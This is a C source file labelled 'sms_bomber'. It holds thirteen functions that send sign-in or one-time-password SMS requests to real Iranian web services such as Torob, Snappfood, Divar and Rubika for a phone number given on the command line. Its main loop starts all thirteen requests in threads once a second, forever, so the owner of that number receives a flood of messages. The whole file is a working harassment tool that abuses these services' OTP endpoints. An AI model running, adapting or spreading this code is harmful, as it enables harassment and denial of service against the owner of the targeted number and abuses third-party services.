/**
 * @file
 * @brief [sms_bomber:c]
 * harzor tager mogaz
 * @author [Ali Naderi](https://github.com/khod-naderi)
*/


#include <stdio.h>
#include <pthread.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>



void *TrobApi(void *phone){  // GET:DATA
    
    char *url = malloc(1000);
    sprintf(url, "https://api.torob.com/a/phone/send-pin/?phone_number=%s", (char *)phone);
    // printf("%s\n", url);
    
    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);
    
    if ( socket ) {
    
        curl_easy_setopt(socket, CURLOPT_URL, url);

        CURLcode res = curl_easy_perform(socket);
        curl_easy_cleanup(socket);
    
    }
    
    curl_global_cleanup();
    free(url);

}

void *HamyarzbanApi(void *phone) { // POST:DATA
    
    char *data = malloc(300);
    sprintf(data, "phone=%s", (char *)phone);
    
    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);
    
    if ( socket ) {
    
        curl_easy_setopt(socket, CURLOPT_URL, "https://hamyarzaban.com/wp-content/themes/hamyarzaban/sms.php");
        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, data);
        
        CURLcode res = curl_easy_perform(socket);
        
        curl_easy_cleanup(socket);
    
    }
    
    curl_global_cleanup();
    free(data);

}

void *AlibabApi(void *phone) { // POST:JSON
    
    struct curl_slist *header = NULL;
    
    char *json = malloc(240);
    sprintf(json, "{\"phoneNumber\":\"%s\"}", phone);

    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);

    if ( socket ) {
        
        curl_easy_setopt(socket, CURLOPT_URL, "https://ws.alibaba.ir/api/v3/account/mobile/otp");

        ///////////////////////////
        //  generate json header
        //////////////////////////
        header = curl_slist_append(header, "Expect:");
        header = curl_slist_append(header, "Content-Type: application/json");
        curl_easy_setopt(socket, CURLOPT_HTTPHEADER, header);

        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, json);

        CURLcode res = curl_easy_perform(socket);
        curl_easy_cleanup(socket);

    }

    curl_global_cleanup();
    free(json);

}

void *SnapfoodApi(void *phone) { // POST:DATA
    
    char *data = malloc(240);
    sprintf(data, "cellphone=%s&captcha=111", phone);

    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);

    if ( socket ) {
        
        curl_easy_setopt(socket, CURLOPT_URL, "https://snappfood.ir/auth/login_with_no_pass");
        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, data);

        CURLcode res = curl_easy_perform(socket);
        curl_easy_cleanup(socket);

    }

    curl_global_cleanup();
    free(data);

}

void *SnapApi(void *phone) { // POST:DATA
    
    char *data = malloc(300);
    sprintf(data, "type=2&phone=%s", (char *)phone);
    
    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);
    
    if ( socket ) {
    
        curl_easy_setopt(socket, CURLOPT_URL, "https://api.snapp.ir/api/v1/sms/link");
        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, data);
        
        CURLcode res = curl_easy_perform(socket);
        
        curl_easy_cleanup(socket);
    
    }
    
    curl_global_cleanup();
    free(data);

}

void *ShadApi(void *phone) { // POST:JSON

    // generate special number
    char *needPhone = malloc(300);
    memcpy( (needPhone + 1), phone, sizeof(phone)+3 );
    *(needPhone) = '9';
    *(needPhone + 1) = '8';
    //printf("%s", needPhone);

    struct curl_slist *header = NULL;
    
    char *json = malloc(240);
    sprintf(json, "{\"api_version\":\"3\",\"method\":\"sendCode\",\"data\":{\"phone_number\":\"%s\",\"send_type\":\"SMS\"}}", needPhone);


    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);

    if ( socket ) {
        
        curl_easy_setopt(socket, CURLOPT_URL, "https://shadmessenger103.iranlms.ir/");

        ///////////////////////////
        //  generate json header
        //////////////////////////
        header = curl_slist_append(header, "Expect:");
        header = curl_slist_append(header, "Content-Type: application/json");
        curl_easy_setopt(socket, CURLOPT_HTTPHEADER, header);

        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, json);

        CURLcode res = curl_easy_perform(socket);
        curl_easy_cleanup(socket);

    }

    curl_global_cleanup();
    free(json);
    free(needPhone);

}

void *Tap30Api(void *phone) { // POST:JSON
    
    struct curl_slist *header = NULL;
    
    char *json = malloc(240);
    sprintf(json, "{\"credential\":{\"phoneNumber\":\"%s\",\"role\":\"PASSENGER\"}}", phone);

    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);

    if ( socket ) {
        
        curl_easy_setopt(socket, CURLOPT_URL, "https://tap33.me/api/v2/user");

        ///////////////////////////
        //  generate json header
        //////////////////////////
        header = curl_slist_append(header, "Expect:");
        header = curl_slist_append(header, "Content-Type: application/json");
        curl_easy_setopt(socket, CURLOPT_HTTPHEADER, header);

        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, json);

        CURLcode res = curl_easy_perform(socket);
        curl_easy_cleanup(socket);

    }

    curl_global_cleanup();
    free(json);

}

void *DivarApi(void *phone) { // POST:JSON
    
    struct curl_slist *header = NULL;
    
    char *json = malloc(240);
    sprintf(json, "{\"phone\":\"%s\"}", phone);

    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);

    if ( socket ) {
        
        curl_easy_setopt(socket, CURLOPT_URL, "https://api.divar.ir/v5/auth/authenticate");

        ///////////////////////////
        //  generate json header
        //////////////////////////
        header = curl_slist_append(header, "Expect:");
        header = curl_slist_append(header, "Content-Type: application/json");
        curl_easy_setopt(socket, CURLOPT_HTTPHEADER, header);

        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, json);

        CURLcode res = curl_easy_perform(socket);
        curl_easy_cleanup(socket);

    }

    curl_global_cleanup();
    free(json);

}

void *Snapfood2Api(void *phone) { // POST:DATA
    
    char *data = malloc(300);
    sprintf(data, "cellphone=%s", (char *)phone);
    
    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);
    
    if ( socket ) {
    
        curl_easy_setopt(socket, CURLOPT_URL, "https://snappfood.ir/customer/app-dl/send");
        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, data);
        
        CURLcode res = curl_easy_perform(socket);
        
        curl_easy_cleanup(socket);
    
    }
    
    curl_global_cleanup();
    free(data);

}

void *LenzApi(void *phone) { // POST:JSON
    
    // generate special number
    char *needPhone = malloc(300);
    memcpy( (needPhone + 1), phone, sizeof(phone)+3 );
    *(needPhone) = '9';
    *(needPhone + 1) = '8';

    struct curl_slist *header = NULL;
    
    char *json = malloc(240);
    sprintf(json, "{\"msisdn\":\"%s\"}", needPhone);

    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);

    if ( socket ) {
        
        curl_easy_setopt(socket, CURLOPT_URL, "https://app.lenz.ir:64014/api/v2/auth/register/otp/generate");

        ///////////////////////////
        //  generate json header
        //////////////////////////
        header = curl_slist_append(header, "Expect:");
        header = curl_slist_append(header, "Content-Type: application/json");
        curl_easy_setopt(socket, CURLOPT_HTTPHEADER, header);

        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, json);

        CURLcode res = curl_easy_perform(socket);
        curl_easy_cleanup(socket);

    }

    curl_global_cleanup();
    free(json);

}

void *NamavaApi(void *phone) { // POST:JSON


    // generate special number
    char *needPhone = malloc(300);
    memcpy( (needPhone+2), phone, sizeof(phone)+3);
    *(needPhone) = '+';
    *(needPhone+1) = '9';
    *(needPhone+2) = '8';

    
    struct curl_slist *header = NULL;
    
    char *json = malloc(240);
    sprintf(json, "{\"UserName\":\"%s\"}", needPhone);

    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);

    if ( socket ) {
        
        curl_easy_setopt(socket, CURLOPT_URL, "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request");

        ///////////////////////////
        //  generate json header
        //////////////////////////
        header = curl_slist_append(header, "Expect:");
        header = curl_slist_append(header, "Content-Type: application/json");
        curl_easy_setopt(socket, CURLOPT_HTTPHEADER, header);

        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, json);

        CURLcode res = curl_easy_perform(socket);
        curl_easy_cleanup(socket);

    }

    curl_global_cleanup();
    free(json);

}

void *RubikaApi(void *phone) { // POST:JSON

    // generate special number
    char *needPhone = malloc(300);
    memcpy( (needPhone + 1), phone, sizeof(phone)+3 );
    *(needPhone) = '9';
    *(needPhone + 1) = '8';
    //printf("%s", needPhone);

    struct curl_slist *header = NULL;
    
    char *json = malloc(240);
    sprintf(json, "\"{\"api_version\":\"3\",\"method\":\"sendCode\",\"data\":{\"phone_number\":\"%s\",\"send_type\":\"SMS\"}}", needPhone);


    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);

    if ( socket ) {
        
        curl_easy_setopt(socket, CURLOPT_URL, "https://messengerg2c53.iranlms.ir/");

        ///////////////////////////
        //  generate json header
        //////////////////////////
        header = curl_slist_append(header, "Expect:");
        header = curl_slist_append(header, "Content-Type: application/json");
        curl_easy_setopt(socket, CURLOPT_HTTPHEADER, header);

        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, json);

        CURLcode res = curl_easy_perform(socket);
        curl_easy_cleanup(socket);

    }

    curl_global_cleanup();
    free(json);
    free(needPhone);

}

void *BamaApi(void *phone) { // POST:DATA
    
    char *data = malloc(300);
    sprintf(data, "cellNumber=%s", (char *)phone);
    
    CURL *socket = curl_easy_init();
    curl_easy_setopt(socket, CURLOPT_VERBOSE, 0L);
    
    if ( socket ) {
    
        curl_easy_setopt(socket, CURLOPT_URL, "https://bama.ir/signin-checkforcellnumber");
        curl_easy_setopt(socket, CURLOPT_POSTFIELDS, data);
        
        CURLcode res = curl_easy_perform(socket);
        
        curl_easy_cleanup(socket);
    
    }
    
    curl_global_cleanup();
    free(data);

}

int main(int argc, char *argv[]){

    if(argc < 2){
        // arg not math
        fprintf(stderr, "[ERORR] Prameter not Math.\texample: sms ( phone )\n\a");
        return -1;
    }

    void *phone = argv[1];
    pthread_t thread;


    curl_global_init(CURL_GLOBAL_DEFAULT);

    while(1){
        // call api sms in new thread

        pthread_create(&thread, NULL, TrobApi, phone);       
        pthread_create(&thread, NULL, HamyarzbanApi, phone);       
        pthread_create(&thread, NULL, AlibabApi, phone);
        pthread_create(&thread, NULL, SnapfoodApi, phone);
        pthread_create(&thread, NULL, SnapApi, phone);
        pthread_create(&thread, NULL, ShadApi, phone);
        pthread_create(&thread, NULL, Tap30Api, phone);
        pthread_create(&thread, NULL, DivarApi, phone);
        pthread_create(&thread, NULL, Snapfood2Api, phone);
        pthread_create(&thread, NULL, LenzApi, phone);
        pthread_create(&thread, NULL, NamavaApi, phone);
        pthread_create(&thread, NULL, RubikaApi, phone);
        pthread_create(&thread, NULL, BamaApi, phone);

        sleep(1);
    }

    return 0;
}
